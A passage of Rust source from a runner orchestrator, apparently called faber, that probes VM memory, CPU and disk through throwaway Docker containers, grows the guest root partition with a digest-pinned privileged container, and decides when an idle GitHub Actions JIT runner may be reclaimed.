/// Probe the VM's live pressure: available memory plus CPU PSI.
///
/// One throwaway container reads both, rather than two separate probes —
/// cheaper, and neither reading depends on the other. `probe_image` now needs
/// `sh`, `grep` and `cat` (the memory-only probe below needed only `grep`).
pub async fn probe_vm_pressure(probe_image: &str) -> anyhow::Result<VmPressure> {
    let out = docker_output(&vm_pressure_probe_args(probe_image), PROBE_TIMEOUT).await?;
    if !out.status.success() {
        anyhow::bail!("vm-pressure probe failed: {}", stderr_of(&out));
    }
    // The trailing `|| true` means a kernel with no PSI (no `some` line, or no
    // file at all) never fails the *command* — `parse_psi_some_avg60` reads
    // that absence as "no signal" rather than an error. A missing
    // `MemAvailable` line is not masked the same way, so it still fails the
    // probe below, exactly as it does for the memory-only probe.
    let text = String::from_utf8_lossy(&out.stdout);
    let kib = parse_mem_available_kib(&text).ok_or_else(|| {
        anyhow::anyhow!(
            "unparsable MemAvailable line: {:?}",
            untrusted::for_log(text.trim(), 120)
        )
    })?;
    Ok(VmPressure {
        mem_available_mib: kib / 1024,
        cpu_some_avg60: crate::cpu::parse_psi_some_avg60(&text),
    })
}

/// The script the VM-pressure probe runs. A constant, and the only thing faber
/// hands that `sh -c`: nothing read from the daemon is part of it (#105).
const VM_PRESSURE_SCRIPT: &str =
    "grep MemAvailable /proc/meminfo; cat /proc/pressure/cpu 2>/dev/null || true";

/// The probe container's argv. `probe_image` is the operator's config, passed as
/// its own argument.
fn vm_pressure_probe_args(probe_image: &str) -> [&str; 6] {
    ["run", "--rm", probe_image, "sh", "-c", VM_PRESSURE_SCRIPT]
}

/// Parse the kB field off a `grep MemAvailable /proc/meminfo` line
/// (`"MemAvailable:   16777216 kB"`) — always the *first* line of the text this
/// is handed, so it reads only [`str::lines`]'s first entry rather than the
/// whole thing. That is what lets [`probe_vm_pressure`]'s combined probe share
/// this with [`probe_mem_available_mib`] below even though its own output has
/// more after that line.
///
/// A figure past [`untrusted::MAX_MEM_MIB`] reads as no headroom at all (#105).
/// Gate 2 admits against it, so a reading no VM could give must hold admission.
/// Dropping it instead would fail the whole probe, which Gate 2 reads as
/// "unknown" and skips, and which takes the CPU half of the same probe with it.
fn parse_mem_available_kib(text: &str) -> Option<u64> {
    let kib = untrusted::number(text.lines().next()?.split_whitespace().nth(1)?)?;
    Some(if kib <= untrusted::MAX_MEM_MIB * 1024 {
        kib
    } else {
        0
    })
}

/// Probe the VM's *available* memory (MiB) for Gate 2. Reads `MemAvailable` from
/// `/proc/meminfo` — the kernel's own "can a new allocation have this without
/// swapping" estimate, which counts reclaimable page cache (unlike `MemFree`,
/// which reads catastrophically low). `/proc/meminfo` isn't namespaced, so an
/// unlimited throwaway container sees the VM-wide numbers.
pub async fn probe_mem_available_mib(probe_image: &str) -> anyhow::Result<u64> {
    let out = docker_output(
        &[
            "run",
            "--rm",
            probe_image,
            "grep",
            "MemAvailable",
            "/proc/meminfo",
        ],
        PROBE_TIMEOUT,
    )
    .await?;
    if !out.status.success() {
        anyhow::bail!("mem-available probe failed: {}", stderr_of(&out));
    }
    let text = String::from_utf8_lossy(&out.stdout);
    let kib = parse_mem_available_kib(&text).ok_or_else(|| {
        anyhow::anyhow!(
            "unparsable MemAvailable line: {:?}",
            untrusted::for_log(text.trim(), 120)
        )
    })?;
    Ok(kib / 1024)
}

/// Free space (MiB) on the disk Docker writes to, as the daemon's own host sees
/// it: inside faber's Linux VM, its disk (#410). `df -kP /` in a throwaway
/// container, whose root is an overlay that reports the filesystem holding
/// Docker's data root. Read-only, with no network, and never pulls: a disk too
/// full to read is not one to pull an image onto, and `probe_image` is already
/// there for the pressure probe.
pub async fn probe_vm_disk_free_mib(probe_image: &str, limit: Duration) -> anyhow::Result<u64> {
    let out = docker_output(&vm_disk_probe_args(probe_image), limit).await?;
    if !out.status.success() {
        // A disk too full for Docker to create the probe container is the
        // reading itself: zero free, not an unknown (#410).
        if stderr_says_disk_full(&String::from_utf8_lossy(&out.stderr)) {
            return Ok(0);
        }
        anyhow::bail!("vm-disk probe failed: {}", stderr_of(&out));
    }
    let text = String::from_utf8_lossy(&out.stdout);
    crate::host::parse_df_avail_mib(&text).ok_or_else(|| {
        anyhow::anyhow!(
            "unparsable df output: {:?}",
            untrusted::for_log(text.trim(), 120)
        )
    })
}

/// ADR-0061 §5: the image the guest's root is grown from. An upstream image
/// pinned by content digest (busybox 1.37.0, whose arm64 build has the `nsenter`
/// applet), never `probe_image`: that is an operator-set, mutable tag, and this
/// container runs privileged. faber publishes no images, so it names one.
pub const GROW_IMAGE: &str =
    "busybox@sha256:a7dbc319b1438115a207e11930dc4bb3e643dcb3ec0bdd694bb36cd8fad289ec";

/// The image IDs [`GROW_IMAGE`] may resolve to on the VM's Docker, checked
/// before every run: the index digest itself (the containerd image store's ID),
/// its arm64 manifest, and that manifest's config (the classic store's ID).
pub const GROW_IMAGE_IDS: [&str; 3] = [
    "sha256:a7dbc319b1438115a207e11930dc4bb3e643dcb3ec0bdd694bb36cd8fad289ec",
    "sha256:d82c2ab94640ded77cf76514ce6a84870761105058a4a9e51b05a8a79be97a6c",
    "sha256:ad4f11f7c85f87c0a6d6c0fe492ad53f9cdcff6e8c88b881360c70eff701c67b",
];

/// What runs in the guest's mount namespace (ADR-0061 §5), with the guest's own
/// tools: root's partition from `findmnt` (never hard-coded), its disk from
/// `lsblk`, `growpart` then `resize2fs`, then a dry run proving nothing is left
/// to grow. Every outcome is one `faber-grow:` line; only `nothing-left` is a
/// success. Fixed text: no job, config or reading reaches it.
pub const GROW_SCRIPT: &str = r#"for t in findmnt lsblk growpart resize2fs; do command -v "$t" >/dev/null 2>&1 || { echo "faber-grow: missing $t"; exit 3; }; done
src=$(findmnt -n -o SOURCE /) || { echo "faber-grow: root not found"; exit 4; }
disk=$(lsblk -n -o PKNAME "$src") && part=$(cat "/sys/class/block/${src##*/}/partition") || { echo "faber-grow: partition of $src not found"; exit 4; }
growpart "/dev/$disk" "$part" >/dev/null 2>&1; rc=$?
[ "$rc" -le 1 ] || { echo "faber-grow: growpart failed ($rc)"; exit 5; }
resize2fs "$src" >/dev/null 2>&1 || { echo "faber-grow: resize2fs failed"; exit 6; }
growpart -N "/dev/$disk" "$part" >/dev/null 2>&1; [ $? -eq 1 ] || { echo "faber-grow: space left after growing"; exit 7; }
echo "faber-grow: nothing-left""#;

/// The resize container's argv: privileged, in the host's PID namespace only to
/// enter PID 1's mount namespace, with no network, from [`GROW_IMAGE`] only.
pub fn grow_args() -> Vec<&'static str> {
    vec![
        "run",
        "--rm",
        "--pull=never",
        "--privileged",
        "--pid=host",
        "--network=none",
        GROW_IMAGE,
        "nsenter",
        "-t",
        "1",
        "-m",
        "--",
        "/bin/sh",
        "-c",
        GROW_SCRIPT,
    ]
}

/// The resize's report: `Ok` only on `faber-grow: nothing-left`, else the
/// `faber-grow:` line that says why (bounded, it is the guest's output).
pub fn parse_grow_report(stdout: &str) -> Result<(), String> {
    let line = stdout
        .lines()
        .rev()
        .find_map(|l| l.trim().strip_prefix("faber-grow: "));
    match line {
        Some("nothing-left") => Ok(()),
        Some(why) => Err(format!(
            "growing root in the Linux VM: {}",
            untrusted::for_log(why, 200)
        )),
        None => Err("growing root in the Linux VM: no report from the resize".into()),
    }
}

/// Pull [`GROW_IMAGE`] once, and check its ID against the pinned digests before
/// every run: a tag never decides what runs privileged.
async fn ensure_grow_image(limit: Duration) -> Result<(), String> {
    let inspect = || {
        docker_output(
            &["image", "inspect", "--format", "{{.Id}}", GROW_IMAGE],
            limit,
        )
    };
    let mut out = inspect().await.map_err(|e| e.to_string())?;
    if !out.status.success() {
        let pulled = docker_output(
            &["pull", "--platform", "linux/arm64", GROW_IMAGE],
            limit * 10,
        )
        .await
        .map_err(|e| e.to_string())?;
        if !pulled.status.success() {
            return Err(format!("pulling {GROW_IMAGE}: {}", stderr_of(&pulled)));
        }
        out = inspect().await.map_err(|e| e.to_string())?;
    }
    let id = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if out.status.success() && GROW_IMAGE_IDS.contains(&id.as_str()) {
        Ok(())
    } else {
        Err(format!(
            "{GROW_IMAGE} resolves to image {}, not the pinned one; not running it",
            untrusted::for_log(&id, 80)
        ))
    }
}

/// ADR-0061 §5: grow the guest's root into the disk it has. `Ok` once the guest
/// reports nothing left to grow; anything else is the `vm-disk-grow` fault's
/// line, a disk too full to create the container included.
pub async fn grow_guest_root(limit: Duration) -> Result<(), String> {
    ensure_grow_image(limit).await?;
    let out = docker_output(&grow_args(), limit)
        .await
        .map_err(|e| format!("running the resize: {e}"))?;
    if !out.status.success() && stderr_says_disk_full(&String::from_utf8_lossy(&out.stderr)) {
        return Err(
            "the Linux VM's disk is too full for Docker to create the resize container".into(),
        );
    }
    parse_grow_report(&String::from_utf8_lossy(&out.stdout))
}

/// What §7 of ADR-0061 counts at its current size: each cache volume, the git
/// mirrors and the runner-image variants, in GiB.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct CacheUsage {
    pub cache_volumes_gib: Vec<f64>,
    pub git_mirrors_gib: f64,
    pub variants_gib: f64,
}

/// A size as Docker's CLI prints it (decimal units: `512B`, `1.5kB`, `2.3GB`),
/// in bytes.
pub fn parse_docker_size(s: &str) -> Option<f64> {
    let s = s.trim();
    let split = s.find(|c: char| c.is_ascii_alphabetic())?;
    let (num, unit) = s.split_at(split);
    let n: f64 = num.trim().parse().ok()?;
    let mult = match unit {
        "B" => 1.0,
        "kB" | "KB" => 1e3,
        "MB" => 1e6,
        "GB" => 1e9,
        "TB" => 1e12,
        _ => return None,
    };
    Some(n * mult)
}

/// [`cache_usage`] past its two reads: `volumes` is `docker system df -v`'s
/// `{{json .Volumes}}`, `variants` one image size per line. Kinds are read from
/// the `org.faber.kind` label, never from a name.
pub fn usage_from(volumes: &str, variants: &str) -> CacheUsage {
    let gib = |b: f64| b / (1u64 << 30) as f64;
    let mut u = CacheUsage::default();
    let listed: Vec<serde_json::Value> = serde_json::from_str(volumes.trim()).unwrap_or_default();
    for v in &listed {
        let labels = v.get("Labels").and_then(|l| l.as_str()).unwrap_or("");
        let kind = labels
            .split(',')
            .find_map(|kv| kv.strip_prefix("org.faber.kind="));
        let size = v
            .get("Size")
            .and_then(|s| s.as_str())
            .and_then(parse_docker_size)
            .unwrap_or(0.0);
        match kind {
            Some("cache") => u.cache_volumes_gib.push(gib(size)),
            Some("git-mirror") => u.git_mirrors_gib += gib(size),
            _ => {}
        }
    }
    u.variants_gib = variants
        .lines()
        .filter_map(parse_docker_size)
        .map(gib)
        .sum();
    u
}

/// Measure [`CacheUsage`] on the VM's Docker. `None` when either read fails.
pub async fn cache_usage(limit: Duration) -> Option<CacheUsage> {
    let volumes = docker_output_capped(
        &["system", "df", "-v", "--format", "{{json .Volumes}}"],
        limit,
        4 << 20,
    )
    .await
    .ok()
    .filter(|o| o.status.success())?;
    let variants = docker_output(
        &[
            "image",
            "ls",
            "--filter",
            "label=org.faber.kind=image",
            "--format",
            "{{.Size}}",
        ],
        limit,
    )
    .await
    .ok()
    .filter(|o| o.status.success())?;
    Some(usage_from(
        &String::from_utf8_lossy(&volumes.stdout),
        &String::from_utf8_lossy(&variants.stdout),
    ))
}

/// Whether a failed call's stderr says the disk is full (ENOSPC).
fn stderr_says_disk_full(stderr: &str) -> bool {
    stderr
        .to_ascii_lowercase()
        .contains("no space left on device")
}

/// The VM-disk probe's argv. `probe_image` is the operator's config, passed as
/// its own argument.
fn vm_disk_probe_args(probe_image: &str) -> [&str; 9] {
    [
        "run",
        "--rm",
        "--pull=never",
        "--network=none",
        "--read-only",
        probe_image,
        "df",
        "-kP",
        "/",
    ]
}

/// Parse the "used" side of a `docker stats` `MemUsage` field ("1.5GiB / 20GiB")
/// into MiB. Returns `None` for unparsable or `--` (a container with no reading
/// yet).
///
/// Also `None` for a figure that is not a reading at all: negative, or not finite
/// (`inf` and `NaN` both parse as `f64`). One past [`untrusted::MAX_MEM_MIB`] is
/// held to it (#105). The learner sizes a class's cap from these peaks, so a
/// reading it cannot believe widens the cap rather than vanishing, and bad input
/// admits less, never more.
fn parse_mem_usage_mib(field: &str) -> Option<u64> {
    let used = field.split('/').next()?.trim();
    if used.is_empty() || used.starts_with("--") {
        return None;
    }
    // Split the number from its unit suffix (GiB / MiB / kB / B, case-insensitive).
    let split = used.find(|c: char| c.is_alphabetic())?;
    let (num, unit) = used.split_at(split);
    let value: f64 = num.trim().parse().ok()?;
    if !value.is_finite() || value < 0.0 {
        return None;
    }
    let mib = match unit.trim().to_ascii_lowercase().as_str() {
        "gib" | "gb" => value * 1024.0,
        "mib" | "mb" => value,
        "kib" | "kb" => value / 1024.0,
        "b" => value / (1024.0 * 1024.0),
        _ => return None,
    };
    // Past the ceiling counts as the ceiling: a peak the learner cannot believe
    // must widen a cap, never be dropped and leave it narrower than the run was.
    Some((mib.round() as u64).min(untrusted::MAX_MEM_MIB))
}

/// One `docker stats --no-stream` reading of `name`: its memory (MiB) and the
/// block and network bytes it has moved, or `None` if the container isn't up
/// yet or the read fails. Deliberately tolerant: the sampler polls
/// opportunistically and a miss just means one skipped sample.
///
/// The I/O columns ride on the reading the sampler already takes (ADR-0056 §4):
/// one call, one cadence, more of each line read.
async fn stats_reading(name: &str) -> Option<StatsReading> {
    let out = docker_output(
        &["stats", "--no-stream", "--format", RUN_STATS_FORMAT, name],
        CLI_TIMEOUT,
    )
    .await
    .ok()?;
    if !out.status.success() {
        return None;
    }
    Some(parse_stats_reading(
        String::from_utf8_lossy(&out.stdout).trim(),
    ))
}

/// One parsed `docker stats` line. Each half is independently optional, so an
/// unreadable I/O column never costs the memory sample.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
struct StatsReading {
    mem_mib: Option<u64>,
    io: Option<IoBytes>,
}

/// One container's memory and I/O columns, one JSON object with each value
/// escaped by Docker's `json` function (#105): a value carrying a tab or a quote
/// cannot forge another column.
const RUN_STATS_FORMAT: &str =
    r#"{"Mem":{{json .MemUsage}},"Block":{{json .BlockIO}},"Net":{{json .NetIO}}}"#;

/// One row of [`RUN_STATS_FORMAT`]. A column that is missing reads empty.
#[derive(Debug, Deserialize)]
struct RunStatsRow {
    #[serde(rename = "Mem", default)]
    mem: String,
    #[serde(rename = "Block", default)]
    block: String,
    #[serde(rename = "Net", default)]
    net: String,
}

fn parse_stats_reading(text: &str) -> StatsReading {
    let rows = untrusted::json_lines::<RunStatsRow>(text, "run sampler: docker stats");
    let Some(row) = rows.into_iter().next() else {
        return StatsReading::default();
    };
    let mem_mib = parse_mem_usage_mib(&row.mem);
    let block = crate::footprint::parse_io_pair(&row.block);
    let net = crate::footprint::parse_io_pair(&row.net);
    let io = block
        .zip(net)
        .map(|((read, written), (received, sent))| IoBytes {
            block_read: read,
            block_written: written,
            net_received: received,
            net_sent: sent,
        });
    StatsReading { mem_mib, io }
}

/// The per-job resource names, all prefixed `faber-` so teardown/inspection is
/// greppable. `id` is the job id carved out of the runner name (`faber-<id>`).
#[derive(Debug, Clone, PartialEq, Eq)]
struct Names {
    /// `<job_id>-<mint_ts>` — the per-claim identity every name and every
    /// ownership mark is built from.
    id: String,
    net: String,
    dind: String,
    runner: String,
    /// dind's `/var/lib/docker` volume. Named so teardown (and the sweep) can
    /// remove it; anonymous, it would outlive `docker rm` and leak per job.
    vol: String,
    /// The read-only volume holding the job-started hook (ADR-0059 §1), and
    /// the container that fills it.
    hook: String,
    hook_fill: String,
}

/// The claim id a runner's containers carry as `org.faber.id`
/// ([`LABEL_ID`]), from the name the runner registers under:
/// `faber-{job_id}-{ts}` → `{job_id}-{ts}`. One definition for the labels
/// [`Names::for_runner`] stamps and for every lookup by them.
pub(crate) fn claim_id(runner_name: &str) -> &str {
    runner_name.strip_prefix("faber-").unwrap_or(runner_name)
}

impl Names {
    fn for_runner(runner_name: &str) -> Self {
        let id = claim_id(runner_name);
        Self {
            id: id.to_string(),
            net: format!("faber-net-{id}"),
            dind: format!("faber-dind-{id}"),
            runner: format!("faber-runner-{id}"),
            vol: format!("faber-vol-{id}"),
            hook: format!("faber-hook-{id}"),
            hook_fill: format!("faber-hook-fill-{id}"),
        }
    }
}

/// Provision a single-use Docker JIT runner for `owner_repo` and run one job to
/// completion. Stands up a private network + dind, mints a JIT config, runs the
/// runner container until its one job exits, then tears everything down.
///
/// Every step of that ramp is *cancellable*. By the time this is called the claim
/// is already `admitted` and its memory reservation already debited (see
/// `reconcile::spawn_provision`), so the ramp runs on the budget's clock: until it
/// reaches the run itself, its reservation is funding a job that may no longer
/// exist while other jobs park waiting for that same memory. The ramp is bounded
/// (a JIT mint, three `docker` calls, a readiness wait — each with its own cap) but
/// *bounded is not cancellable*: without the checks below, a reclaim issued mid-ramp
/// took effect only once the whole ramp had run, having built a sandbox for a job
/// that was already gone.
#[allow(clippy::too_many_arguments)]
pub async fn run_one(
    gh: &Github,
    owner_repo: &str,
    runner_name: &str,
    labels: &[String],
    cfg: &DockerConfig,
    limits: &Limits,
    claim: &ClaimMarks,
    cancel: watch::Receiver<bool>,
) -> anyhow::Result<RunReport> {
    let names = Names::for_runner(runner_name);

    // Nothing per-job exists yet in Docker on any path above `run_in_sandbox`, so
    // these returns deliberately skip [`teardown`] — there is nothing to reap, and
    // running it would only log four removals of things that were never created.
    // What does exist after the mint is the registration on GitHub, which a
    // reclaim from there on withdraws ([`reclaimed_after_mint`]).
    if reclaim_pending(&cancel) {
        return Ok(reclaimed_while_provisioning(
            &names.runner,
            "before the JIT mint",
        ));
    }

    // Mint the JIT config immediately before launch — it expires ~60 min out.
    // Marked, so the cause names the mint rather than the sandbox (#89).
    let jit = gh
        .generate_jitconfig(
            owner_repo,
            runner_name,
            labels,
            "_work",
            "provision a job this host claimed",
        )
        .await
        .map_err(|e| anyhow::Error::new(e).context(MintFailed))?;

    // What a reclaim has to withdraw from GitHub before it may kill this runner,
    // or abandon the ramp that would launch it: the runner this process just
    // minted, named by the mint itself (#105).
    let registration = Registration {
        gh,
        minted: Some(MintedRunner::from_mint(
            owner_repo,
            runner_name,
            jit.runner_id,
        )),
    };

    // Checked after the mint rather than racing it: abandoning that request
    // mid-flight can still leave GitHub holding a registration this process never
    // learned of, which only the stale-runner sweep would then remove. The call is
    // bounded ([`crate::github`]), so the wait is short, and the registration a
    // reclaim finds here is withdrawn on the way out.
    if reclaim_pending(&cancel) {
        return Ok(reclaimed_after_mint(&registration, &names.runner, "after the JIT mint").await);
    }

    // The persistent cache volume, when the profile opts in. `volume create` is
    // idempotent (an existing volume is a no-op that echoes the name), so this is
    // also what creates it on the very first job. Best-effort by design: a cache
    // is an optimisation, and failing to provide one must degrade to a slower job,
    // never to a failed one — teardown never removes it, so the only cost of
    // skipping it here is that this job runs cold.
    let cache_vol = match cfg.cache_volume {
        false => None,
        true => {
            let name = cache_volume_name(owner_repo);
            // LAUNCH_TIMEOUT, not CLI_TIMEOUT: like `network create` this builds
            // real state on the provisioning path rather than answering a
            // question, so it gets the wider budget a loaded daemon may need.
            let cache_marks = marks(KIND_CACHE, owner_repo, &names.id);
            match docker_ok(&volume_create_args(&name, &cache_marks), LAUNCH_TIMEOUT).await {
                Ok(()) => Some(name),
                Err(e) => {
                    warn!(
                        "docker runner {}: cache volume {name} unavailable ({e}) — \
                         running this job without it",
                        names.runner
                    );
                    None
                }
            }
        }
    };

    if reclaim_pending(&cancel) {
        return Ok(
            reclaimed_after_mint(&registration, &names.runner, "after the cache volume").await,
        );
    }

    // The repo's git mirror, when the profile opts in (ADR-0035 §2). `None` until
    // its first refresh has finished, and while faber is pruning or deleting it:
    // the job then checks out as before. Held until after teardown, because the
    // lease is what keeps `gc --prune=now` from running under a mounted mirror.
    let mirror = if cfg.git_mirror {
        crate::git_mirror::global().lease_checked(owner_repo).await
    } else {
        None
    };

    // From here a reclaim may find real state behind it, so every return below —
    // reclaim included — goes through `teardown`.
    let result = run_in_sandbox(
        &names,
        owner_repo,
        &registration,
        &jit.encoded,
        cache_vol.as_deref(),
        mirror.as_ref().map(|m| m.volume()),
        cfg,
        limits,
        claim,
        cancel,
    )
    .await;
    let services = cfg.services.names();
    let mirror_incident = teardown(&names, cfg.dind.granted(), &services, owner_repo).await;
    drop(mirror);
    // ADR-0046 §9: the outcome names the services this runner had.
    result.map(|mut report| {
        report.services = services;
        note_mirror_incident(&mut report, &names.runner, mirror_incident);
        report
    })
}

/// The JIT mint failed: the context on a [`run_one`] error that started no
/// container. It names the failing step in the audit cause (#89).
#[derive(Debug)]
pub struct MintFailed;

impl std::fmt::Display for MintFailed {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("minting the JIT runner config")
    }
}

/// Resolve only when `cancel` is genuinely set true. If every sender has been
/// dropped (not expected while the claim is held, but possible in principle),
/// pend forever rather than reporting a spurious cancel — so the run / lifetime-cap
/// arm decides the outcome instead of a phantom reclaim killing a live runner.
async fn wait_cancelled(cancel: &mut watch::Receiver<bool>) {
    if cancel.wait_for(|c| *c).await.is_err() {
        std::future::pending::<()>().await;
    }
}

/// Whether the claim reconciler has already reclaimed this provision.
///
/// The *seam* check, used between two steps of the provisioning ramp. Deliberately
/// a check rather than a race: each ramp step either creates real state (a network,
/// a dind, a GitHub runner registration) or is already bounded, and abandoning one
/// mid-flight would leave the daemon finishing work that teardown has already swept
/// past. Every step therefore runs to completion, and the reclaim is honoured at the
/// next seam.
fn reclaim_pending(cancel: &watch::Receiver<bool>) -> bool {
    *cancel.borrow()
}

/// Race `step` against the reclaim signal; `None` means the reclaim won.
///
/// The counterpart to [`reclaim_pending`], for the steps that create *nothing* and
/// so are safe to abandon half-finished. `biased` so an already-set signal wins
/// even when `step` is ready — a reclaimed claim must not quietly proceed because
/// its step happened to finish in the same poll.
async fn until_reclaimed<F: std::future::Future>(
    cancel: &mut watch::Receiver<bool>,
    step: F,
) -> Option<F::Output> {
    tokio::select! {
        biased;
        _ = wait_cancelled(cancel) => None,
        out = step => Some(out),
    }
}

/// The report for a reclaim that landed *during provisioning*, before any job could
/// start. `at` names the seam it was noticed at, so the log says how far the ramp
/// got. Clean like a mid-run reclaim rather than a failure: it ran no representative
/// job, so the caller keeps it out of the learner and records it as `reclaimed`.
fn reclaimed_while_provisioning(runner: &str, at: &str) -> RunReport {
    info!("docker runner {runner}: reclaimed while provisioning ({at})");
    RunReport {
        reclaimed: true,
        // The seam is the whole content of this outcome: "reclaimed" says the
        // claim went away, and only the seam says how much of the ramp had been
        // paid for when it did.
        cause: Some(format!("reclaimed while provisioning, {at}")),
        ..Default::default()
    }
}

/// [`reclaimed_while_provisioning`] at a seam after the JIT mint, which first
/// withdraws the registration the mint created (#269).
///
/// No runner container has started at any such seam, so no job can be running
/// under the registration and the reclaim goes ahead whatever GitHub answers.
/// The withdrawal is cleanup: left alone, the registration counts as connecting
/// supply until the stale-runner sweep removes it (ADR-0018), and one GitHub
/// does not let go of is still left to that sweep.
async fn reclaimed_after_mint(
    registration: &Registration<'_>,
    runner: &str,
    at: &str,
) -> RunReport {
    match withdraw_registration(registration, UNUSED_WITHDRAWAL).await {
        Withdrawal::Withdrawn => {}
        Withdrawal::JobAssigned => warn!(
            "docker runner {runner}: reclaimed while provisioning ({at}), and GitHub reports a \
             job assigned to a runner that never started — its registration is left to the \
             stale-runner sweep"
        ),
        Withdrawal::Failed(e) => warn!(
            "docker runner {runner}: reclaimed while provisioning ({at}), and its registration \
             could not be withdrawn ({e}) — it is left to the stale-runner sweep"
        ),
    }
    reclaimed_while_provisioning(runner, at)
}

// --- reclaim clearance (ADR-0017) ---------------------------------------------
//
// The claim reconciler decides a runner is idle from GitHub's view of it: the
// runner list's `busy` flag and the state of the job the runner was minted for.
// That view is neither fresh nor exact. The list is read once per cycle and acted
// on seconds later, while an idle runner is precisely the one GitHub hands the next
// queued job; and a JIT runner is not job-pinned, so the minted-for job says
// nothing about what the runner is doing. Acting on that view alone killed runners
// in the middle of other jobs, which GitHub then failed with "The self-hosted
// runner lost communication with the server".
//
// So the reconciler only *requests* a reclaim. Whether the runner may be killed is
// answered here, where the kill happens, from two sources read at that moment: the
// container's own process table, and GitHub refusing to deregister a runner that
// has a job assigned. Deregistering first is also what makes the answer hold until
// the kill lands — a runner GitHub has forgotten cannot be handed a job.

/// The runner agent's per-job process. The listener spawns it when GitHub hands
/// over a job, and it lives until that job — post steps included — is finished.
const WORKER_PROCESS: &str = "Runner.Worker";

/// How long a run whose container has already stopped gets to report its own exit
/// before a reclaim of it is recorded instead. A stopped container normally makes
/// `docker wait` return within moments; one that never does is a wedged client,
/// which must not hold the claim (or a drain) open.
const STOPPED_SETTLE: Duration = Duration::from_secs(5);

/// The GitHub side of one runner: what a reclaim withdraws before it may kill.
pub(crate) struct Registration<'a> {
    gh: &'a Github,
    /// The runner as faber's own record of minting it names it, or `None` when no
    /// such record exists. Then nothing about it is ever written to GitHub, so a
    /// reclaim of it is always refused (see [`MintedRunner`]).
    minted: Option<MintedRunner>,
}

/// A runner this host minted, as faber's own records name it. It is the only
/// target a GitHub write about a runner may have.
///
/// # The rule (#105)
///
/// faber writes to GitHub about a runner only when the target comes from its own
/// record of minting it. Today that write is a reclaim withdrawing the runner's
/// registration (ADR-0017). The record is one of two things:
///
/// - **This process minted it.** The name it registered and the id
///   `generate-jitconfig` answered with ([`MintedRunner::from_mint`]).
/// - **An earlier process did.** The `mint` line that process wrote to the audit
///   log when it chose the name ([`MintedRunner::recorded`]). The container that
///   claims to be the runner must match that line exactly, repo and name. GitHub's
///   runner list then supplies the id for that exact name, so the runner must also
///   still be registered there under it.
///
/// A name, an id or a repo that a container reports is never enough. On a host
/// that grants dind (ADR-0013) a job is root in the VM that runs Docker, and can
/// make the daemon say anything: a label is a claim, not a fact. An adopted
/// container that no record vouches for is still watched, charged and torn down,
/// all on the Docker side. But faber neither reads nor writes its registration, so
/// a reclaim of it is refused and it runs until its job or its lifetime cap ends it.
///
/// The audit log was within that root's reach only on the Docker Desktop
/// backend. There it lived under `~/Library/Logs/faber`, and Docker Desktop shares
/// `/Users` into its VM by default, so root in the VM could forge a `mint` line;
/// that was moot only because the same share already exposed faber's binary and
/// config. ADR-0026's VMs close the gap on a set-up host: none shares a host
/// folder (`checkWall`, in `launcher/Sources/Wall.swift`, refuses any
/// directory-sharing device), so no guest can reach the record.
///
/// Both constructors refuse a repo or a name that is not in faber's own format,
/// and [`Github::withdraw_runner`] checks the same again before it builds a URL.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MintedRunner {
    repo: String,
    name: String,
    /// GitHub's id for the registration, when the mint answered with one. Without
    /// it the registration is looked up by its exact name.
    id: Option<u64>,
}

impl MintedRunner {
    /// The runner this process just minted: `name` is what it registered, `id`
    /// what `generate-jitconfig` answered with.
    pub(crate) fn from_mint(repo: &str, name: &str, id: Option<u64>) -> Self {
        Self {
            repo: repo.to_string(),
            name: name.to_string(),
            id,
        }
    }

    /// A runner an earlier process minted, from the `mint` line it wrote to the
    /// audit log. `None` unless both are in the form faber writes them.
    pub fn recorded(repo: &str, name: &str) -> Option<Self> {
        (untrusted::repo_slug(repo) && untrusted::runner_name(name).is_some()).then(|| Self {
            repo: repo.to_string(),
            name: name.to_string(),
            id: None,
        })
    }

    /// The repo it was minted on.
    pub fn repo(&self) -> &str {
        &self.repo
    }

    /// The name it registered under (`faber-{job_id}-{ts}`).
    pub fn name(&self) -> &str {
        &self.name
    }
}

/// What a runner container is doing right now, read from its own process table.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum RunnerActivity {
    /// [`WORKER_PROCESS`] is running: the runner is executing a job.
    Executing,
    /// Running with no worker: waiting for a job, still starting, or on its way out.
    Idle,
    /// The container is not running, so nothing in it is executing anything.
    Stopped,
    /// The process table could not be read. Not evidence of anything.
    Unknown,
}

/// What asking GitHub to forget a runner established.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Withdrawal {
    /// The registration is gone — removed now, or already absent — so GitHub can
    /// assign the runner nothing more.
    Withdrawn,
    /// GitHub refused: it has a job assigned to the runner. Checked by GitHub when
    /// the request arrives, where the runner list's `busy` flag was read earlier.
    JobAssigned,
    /// Neither done nor confirmed. Not evidence either way.
    Failed(String),
}

/// Whether a requested reclaim may kill the runner.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Clearance {
    /// Executing nothing, and withdrawn from GitHub: killing it aborts nothing, and
    /// nothing can be assigned to it before the kill lands.
    Idle,
    /// The container has already stopped; there is nothing left to kill.
    Stopped,
    /// Not safe to kill. The reason is for the log.
    Refused(String),
}

/// Decide a reclaim request from the runner itself, never from the reconciler's
/// view of it.
///
/// In order: look at the container, withdraw the registration, look again.
///
/// - A worker in the process table is a job running *now*, whatever GitHub's
///   runner list says — refused, and GitHub is not even asked.
/// - The withdrawal is the atomic half. GitHub refuses to delete a runner with a
///   job assigned, including one assigned after the first look; once it has
///   agreed, it can assign the runner nothing more.
/// - The second look catches a job the listener accepted in the instant before
///   the withdrawal landed, which the first look was too early to see.
///
/// Anything unreadable refuses. A refused reclaim costs an idle runner a little
/// longer on its memory reservation; a wrong kill costs a job.
pub(crate) async fn reclaim_clearance<A, AF, W, WF>(mut activity: A, withdraw: W) -> Clearance
where
    A: FnMut() -> AF,
    AF: std::future::Future<Output = RunnerActivity>,
    W: FnOnce() -> WF,
    WF: std::future::Future<Output = Withdrawal>,
{
    match activity().await {
        RunnerActivity::Executing => return Clearance::Refused("a job is running in it".into()),
        RunnerActivity::Unknown => {
            return Clearance::Refused("its process table could not be read".into())
        }
        RunnerActivity::Stopped => return Clearance::Stopped,
        RunnerActivity::Idle => {}
    }
    match withdraw().await {
        Withdrawal::Withdrawn => {}
        Withdrawal::JobAssigned => {
            return Clearance::Refused("GitHub has a job assigned to it".into())
        }
